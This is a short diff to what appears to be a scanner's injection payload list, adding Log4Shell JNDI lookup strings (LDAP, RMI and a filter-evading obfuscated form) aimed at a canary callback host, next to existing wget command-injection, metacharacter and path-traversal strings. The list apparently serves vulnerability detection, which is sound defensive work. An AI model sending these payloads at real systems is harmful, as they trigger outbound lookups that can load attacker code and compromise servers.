@@ -58,3 +58,6 @@ ${wget @canary_url}
 {base}"}{
 #!/bin/bash%a0wget%20@canary_url
 ${$($([]/<\\n))}'"!&|&&||$}()%^:{}\+=\`$()</>]]]}}})))../../../\@#*.,;
+${jndi:ldap://@canary_dns:1389/a}
+${jndi:rmi://@canary_dns:1099/a}
+${${::-J}n${::-d}i:ld${::-a}p://@canary_dns:1389}
